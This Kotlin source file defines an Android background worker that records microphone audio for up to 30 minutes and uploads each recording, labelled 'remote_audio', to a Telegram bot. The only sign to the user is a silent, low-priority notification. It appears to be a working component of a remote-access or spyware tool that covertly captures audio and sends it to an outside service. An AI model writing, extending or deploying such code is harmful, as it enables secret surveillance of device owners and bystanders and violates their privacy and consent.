package com.example.worker

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.CoroutineWorker
import androidx.work.Data
import androidx.work.ForegroundInfo
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.example.data.sync.AudioRecorderHelper
import com.example.data.sync.TelegramBotManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class AudioRecordingWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        const val KEY_DURATION_SEC = "duration_sec"
        const val WORK_NAME = "AudioRecordingWork"

        fun enqueueWork(context: Context, durationSec: Int = 1800) {
            val inputData = Data.Builder()
                .putInt(KEY_DURATION_SEC, durationSec)
                .build()

            val workRequest = OneTimeWorkRequestBuilder<AudioRecordingWorker>()
                .setInputData(inputData)
                .build()

            WorkManager.getInstance(context).enqueue(workRequest)
            Log.d("AudioRecordingWorker", "Enqueued background audio recording work for $durationSec seconds.")
        }
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        val durationSec = inputData.getInt(KEY_DURATION_SEC, 1800)
        Log.d("AudioRecordingWorker", "Starting background audio recording session of $durationSec seconds...")

        try {
            setForeground(createForegroundInfo())
        } catch (e: Exception) {
            Log.w("AudioRecordingWorker", "Failed to set foreground info: ${e.message}")
        }

        val audioHelper = AudioRecorderHelper(applicationContext)
        try {
            val base64Data = audioHelper.startRecording(durationSec)
            if (base64Data != null) {
                val base64Content = base64Data.substringAfter(",")
                val audioBytes = Base64.decode(base64Content, Base64.NO_WRAP)
                val nowMs = System.currentTimeMillis()

                // Upload to Telegram or process recording
                try {
                    val telegramBot = TelegramBotManager(applicationContext)
                    val audioExt = if (base64Data.contains("audio/wav")) "wav" else if (base64Data.contains("audio/mp4")) "m4a" else "amr"
                    telegramBot.sendAudio(
                        audioBytes,
                        "remote_audio_${nowMs}.$audioExt",
                        "Background Recording - Duration: $durationSec sec (${(audioBytes.size / 1024)} KB)"
                    )
                    Log.d("AudioRecordingWorker", "Background audio recording successfully uploaded to Telegram.")
                } catch (e: Exception) {
                    Log.e("AudioRecordingWorker", "Failed to upload recorded audio to Telegram: ${e.message}")
                }

                return@withContext Result.success()
            } else {
                Log.w("AudioRecordingWorker", "Audio recording returned null data, retrying...")
                return@withContext Result.retry()
            }
        } catch (e: SecurityException) {
            Log.e("AudioRecordingWorker", "Microphone permission missing: ${e.message}")
            return@withContext Result.failure()
        } catch (e: Exception) {
            Log.e("AudioRecordingWorker", "Audio recording stream interrupted or failed: ${e.message}")
            // Gracefully handle interruptions by retrying transient failures or succeeding if non-critical
            return@withContext Result.retry()
        } finally {
            try {
                audioHelper.cleanup()
            } catch (_: Exception) {}
        }
    }

    private fun createForegroundInfo(): ForegroundInfo {
        val channelId = "audio_recording_channel"
        val notificationManager = applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Remote Audio Recording",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Running secure background audio recording session"
                setSound(null, null)
                enableVibration(false)
            }
            notificationManager?.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(applicationContext, channelId)
            .setContentTitle("Audio Recording Service")
            .setContentText("Recording audio session in background...")
            .setSmallIcon(android.R.drawable.ic_menu_mic)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ForegroundInfo(1002, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
        } else {
            ForegroundInfo(1002, notification)
        }
    }
}
